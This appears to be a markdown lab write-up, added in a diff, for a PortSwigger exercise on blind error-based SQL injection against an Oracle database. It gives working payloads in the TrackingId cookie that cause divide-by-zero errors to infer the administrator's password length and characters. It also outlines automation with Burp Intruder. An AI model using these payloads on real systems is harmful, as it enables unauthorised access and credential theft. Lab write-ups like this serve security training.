@@ -1,0 +1,173 @@
+# 🔐 Blind SQL Injection with Conditional Errors — Write-Up
+
+## 📌 Lab Overview
+
+This lab demonstrates a **Blind SQL Injection vulnerability using conditional errors**.
+The application processes a `TrackingId` cookie in a SQL query but does not return query results directly.
+
+Instead:
+
+* ✅ No visible difference for TRUE/FALSE conditions
+* ❗ **Database errors are reflected in the response**
+
+We exploit this behavior to extract the administrator's password.
+
+---
+
+## 🎯 Objective
+
+Retrieve the password of the `administrator` user from the `users` table and log in.
+
+---
+
+## 🧠 Vulnerability Type
+
+* Blind SQL Injection (Error-Based)
+* Injection Point: `TrackingId` cookie
+
+---
+
+## 🛠️ Tools Used
+
+* Burp Suite (Repeater & Intruder)
+
+---
+
+## 🔍 Step 1 — Identify Injection Point
+
+Intercept a request:
+
+GET / HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Cookie: TrackingId=xyz123; session=abc456
+
+Test for SQL injection:
+
+TrackingId=xyz123'
+
+If this triggers an error → injection confirmed.
+
+---
+
+## ⚡ Step 2 — Confirm Error-Based Behavior
+
+Use a conditional query that triggers an error:
+
+TrackingId=xyz123'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+👉 If TRUE → division by zero → error shown
+👉 If FALSE → no error
+
+---
+
+## 🧪 Step 3 — Detect Database Type
+
+This lab uses **Oracle database**, confirmed by:
+
+* `dual` table
+* `TO_CHAR()` function
+
+---
+
+## 🔢 Step 4 — Determine Password Length
+
+Payload:
+
+TrackingId=xyz123'||(SELECT CASE WHEN (LENGTH(password)>10) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+Increase the number until an error occurs.
+
+Example result:
+
+✔ Password length = 20
+
+---
+
+## 🔤 Step 5 — Extract Password (Character by Character)
+
+Use `SUBSTR()` to extract characters.
+
+Payload:
+
+TrackingId=xyz123'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+If error occurs → condition is TRUE → correct character.
+
+Repeat for each position:
+
+Position 1 → a
+Position 2 → d
+Position 3 → m
+...
+
+Continue until full password is extracted.
+
+---
+
+## ⚡ Step 6 — Automate Using Burp Intruder (Optional)
+
+1. Send request to Intruder
+2. Mark character position
+3. Use payload list:
+
+a b c d e ... 0 1 2 ...
+
+4. Identify correct character based on error responses
+
+---
+
+## 🔓 Step 7 — Login
+
+After extracting password:
+
+* Go to `/login`
+* Enter:
+
+Username: administrator
+Password: extracted_password
+
+Lab solved ✅
+
+---
+
+## 🧠 Key Concept
+
+This attack relies on **error-based inference**:
+
+| Condition | Result          |
+| --------- | --------------- |
+| TRUE      | Database error  |
+| FALSE     | Normal response |
+
+This allows data extraction even when results are not directly visible.
+
+---
+
+## 💥 Impact
+
+An attacker can:
+
+* Extract sensitive database information
+* Retrieve credentials
+* Fully compromise user accounts
+
+---
+
+## 🧾 Example Payload
+
+TrackingId=xyz123'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+---
+
+## 🚀 Key Takeaways
+
+* Blind SQLi does not require visible output
+* Errors can be used as a side-channel
+* Oracle-specific payloads differ from MySQL/PostgreSQL
+* Automation significantly speeds up exploitation
+
+---
+
+## 📁 Tags
+
+#SQLInjection #BlindSQLi #ErrorBased #CyberSecurity #PortSwigger #BugBounty
